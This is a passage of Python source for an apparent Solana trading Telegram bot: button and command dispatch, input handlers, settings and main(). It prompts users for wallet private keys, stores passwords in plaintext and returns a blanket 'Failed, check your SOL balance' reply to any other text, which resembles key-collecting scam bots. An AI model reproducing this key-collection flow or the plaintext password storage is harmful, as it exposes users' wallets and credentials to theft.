        await set_fee_option(update, context, 'turbo')
    elif query.data == "fee_custom":
        await request_custom_fee(update, context)
    elif query.data == "sell_fee_override":
        await request_sell_fee_override(update, context)
    elif query.data == "buy_settings":
        await show_buy_settings_menu(update, context)
    elif query.data == "sell_settings":
        await show_sell_settings_menu(update, context)
    elif query.data == "bolt_settings":
        await show_bolt_settings_menu(update, context)
    elif query.data == "simple_mode":
        await toggle_setting(update, context, 'simple_mode')
    elif query.data == "advanced_mode":
        await toggle_setting(update, context, 'simple_mode')
    elif query.data == "language_settings":
        await show_language_menu(update, context)
    elif query.data.startswith("set_language_"):
        await set_language(update, context)
    elif query.data == "back_to_settings":
        await show_settings_menu(update, context)
    elif query.data == "account_security":
        await show_account_security_menu(update, context)
    elif query.data == "create_sap":
        await setup_secure_password(update, context)
    elif query.data == "change_sap":
        await change_secure_password(update, context)
    elif query.data in ["toggle_pnl_values", "toggle_negative_cards", "toggle_community_cards"]:
        setting_name = query.data[7:]  # remove 'toggle_' prefix
        await toggle_setting(update, context, setting_name)
    elif query.data.startswith("set_buy_amount_"):
        amount = query.data.split('_')[-1]
        if 'trade_settings' not in context.user_data:
            context.user_data['trade_settings'] = {}
        context.user_data['trade_settings']['buy_amount'] = amount
        await query.answer(f"Buy amount set to {amount} SOL")
    elif query.data.startswith("set_sell_amount_"):
        amount = query.data.split('_')[-1]
        if 'trade_settings' not in context.user_data:
            context.user_data['trade_settings'] = {}
        context.user_data['trade_settings']['sell_amount'] = amount
        await query.answer(f"Sell amount set to {amount}%")
    elif query.data.startswith("set_buy_slippage_"):
        slippage = query.data.split('_')[-1]
        if 'trade_settings' not in context.user_data:
            context.user_data['trade_settings'] = {}
        context.user_data['trade_settings']['buy_slippage'] = slippage
        await query.answer(f"Buy slippage set to {slippage}%")
    elif query.data.startswith("set_sell_slippage_"):
        slippage = query.data.split('_')[-1]
        if 'trade_settings' not in context.user_data:
            context.user_data['trade_settings'] = {}
        context.user_data['trade_settings']['sell_slippage'] = slippage
        await query.answer(f"Sell slippage set to {slippage}%")
    elif query.data == "buy_amounts_simple":
        await query.answer("Buy amounts configured", show_alert=False)
    elif query.data == "sell_amounts_simple":
        await query.answer("Sell amounts configured", show_alert=False)
    else:
        await query.edit_message_text(text=f"Action: {query.data}")

# ======================= COMMANDS =======================
async def handle_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    command = update.message.text.lower()
    
    if command == '/buy':
        await start_buy_process(update, context)
    elif command == '/sell':
        await show_sell_menu(update, context)
    elif command == '/positions':
        await show_positions_menu(update, context)
    elif command == '/settings':
        await show_settings_menu(update, context)
    elif command == '/snipe':
        await show_sniper_menu(update, context)
    elif command == '/burn':
        await show_limit_orders_menu(update, context)
    elif command == '/withdraw':
        await handle_withdraw(update, context)
    elif command == '/help':
        await show_help_menu(update, context)
    elif command == '/backup':
        await start(update, context)
    else:
        await start(update, context)
        

# ======================= MESSAGE HANDLER =======================
async def handle_address_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()
    
     # Handle custom amount inputs
    if 'awaiting_input' in context.user_data:
        input_type = context.user_data['awaiting_input']
        
        if input_type == 'custom_buy_amount':
            try:
                amount = float(text)
                if amount > 0:
                    # Update the first buy amount slot with custom value
                    if 'buy_amounts' not in context.user_data:
                        context.user_data['buy_amounts'] = ["0.01", "0.05", "0.1", "0.5", "1.0"]
                    context.user_data['buy_amounts'][0] = f"{amount:.2f}"
                    await update.message.reply_text(f"Custom buy amount set to {amount} SOL")
                    await show_buy_settings_menu(update, context)
                else:
                    await update.message.reply_text("Amount must be positive. Please try again:")
            except ValueError:
                await update.message.reply_text("Invalid amount. Please enter a number (e.g., 0.25):")
        
        elif input_type == 'custom_sell_amount':
            try:
                amount = float(text)
                if 0 < amount <= 100:
                    # Update the first sell amount slot with custom value
                    if 'sell_amounts' not in context.user_data:
                        context.user_data['sell_amounts'] = ["25", "50", "75", "100"]
                    context.user_data['sell_amounts'][0] = f"{int(amount)}"
                    await update.message.reply_text(f"Custom sell percentage set to {int(amount)}%")
                    await show_sell_settings_menu(update, context)
                else:
                    await update.message.reply_text("Percentage must be between 0 and 100. Please try again:")
            except ValueError:
                await update.message.reply_text("Invalid percentage. Please enter a number (e.g., 30):")
        
        del context.user_data['awaiting_input']
        return
    
    # Handle settings inputs first
    if 'awaiting_input' in context.user_data:
        input_type = context.user_data['awaiting_input']
        
        if input_type == 'custom_fee':
            if text.endswith('SOL'):
                try:
                    amount = float(text.split(' ')[0])
                    if 'settings' not in context.user_data:
                        context.user_data['settings'] = {}
                    
                    context.user_data['settings']['custom_fee'] = text
                    context.user_data['settings']['fee_option'] = 'custom'
                    
                    if context.user_data['settings'].get('simple_mode', False):
                        await show_simple_mode_menu(update, context)
                    else:
                        await show_settings_menu(update, context)
                except ValueError:
                    await update.message.reply_text("Invalid format. Please enter like: 0.0005 SOL")
            else:
                await update.message.reply_text("Please include 'SOL' in your input (e.g., 0.0005 SOL)")
        
        elif input_type == 'sell_fee_override':
            if text.lower() == 'none':
                if 'settings' not in context.user_data:
                    context.user_data['settings'] = {}
                context.user_data['settings']['sell_fee_override'] = None
                
                if context.user_data['settings'].get('simple_mode', False):
                    await show_simple_mode_menu(update, context)
                else:
                    await show_settings_menu(update, context)
            elif text.endswith('SOL'):
                try:
                    amount = float(text.split(' ')[0])
                    if 'settings' not in context.user_data:
                        context.user_data['settings'] = {}
                    
                    context.user_data['settings']['sell_fee_override'] = text
                    
                    if context.user_data['settings'].get('simple_mode', False):
                        await show_simple_mode_menu(update, context)
                    else:
                        await show_settings_menu(update, context)
                except ValueError:
                    await update.message.reply_text("Invalid format. Please enter like: 0.0005 SOL")
            else:
                await update.message.reply_text("Please include 'SOL' in your input (e.g., 0.0005 SOL) or type 'none' to remove")
        
        elif input_type == 'secure_password':
            if len(text) >= 6:
                if 'settings' not in context.user_data:
                    context.user_data['settings'] = {}
                context.user_data['settings']['secure_password'] = text  # Note: In production, hash this password
                await update.message.reply_text("Secure Action Password has been set successfully!")
                await show_account_security_menu(update, context)
            else:
                await update.message.reply_text("Password must be at least 6 characters. Please try again:")
                return  # Don't delete awaiting_input yet
        
        elif input_type == 'verify_password':
            if 'settings' in context.user_data and context.user_data['settings'].get('secure_password') == text:
                await update.message.reply_text("Please enter your new Secure Action Password (min 6 characters):")
                context.user_data['awaiting_input'] = 'change_password'
            else:
                await update.message.reply_text("Incorrect password. Please try again:")
                return
        
        elif input_type == 'change_password':
            if len(text) >= 6:
                if 'settings' not in context.user_data:
                    context.user_data['settings'] = {}
                context.user_data['settings']['secure_password'] = text  # Note: In production, hash this password
                await update.message.reply_text("Secure Action Password has been changed successfully!")
                await show_account_security_menu(update, context)
            else:
                await update.message.reply_text("Password must be at least 6 characters. Please try again:")
                return
        
        del context.user_data['awaiting_input']
        return
    
    # Existing address input handling
    state = USER_STATE.get(user_id)
    if state == "AWAITING_PRIVATE_KEY":
        await handle_private_key(update, context)
    elif state == "AWAITING_COPY_TRADE_ADDRESS":
        await handle_copy_trade_address(update, context)
    elif state == "AWAITING_SNIPER_ADDRESS":
        await handle_sniper_address(update, context)
    elif state == "AWAITING_WITHDRAWAL_ADDRESS":
        await handle_withdraw_address(update, context)
    else:
        await update.message.reply_text("❌ Failed, Check again your SOL Balance.")

# ======================= MAIN =======================
def main():
    app = Application.builder().token(TOKEN).build()

    # Command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("buy", show_buy_menu))
    app.add_handler(CommandHandler("sell", show_sell_menu))
    app.add_handler(CommandHandler("positions", show_positions_menu))
    app.add_handler(CommandHandler("settings", show_settings_menu))
    app.add_handler(CommandHandler("snipe", show_sniper_menu))
    app.add_handler(CommandHandler("burn", show_limit_orders_menu))
    app.add_handler(CommandHandler("withdraw", handle_withdraw))
    app.add_handler(CommandHandler("help", show_help_menu))
    app.add_handler(CommandHandler("backup", start))

    # Callback and message handlers
    app.add_handler(CallbackQueryHandler(handle_button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_address_input))

    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()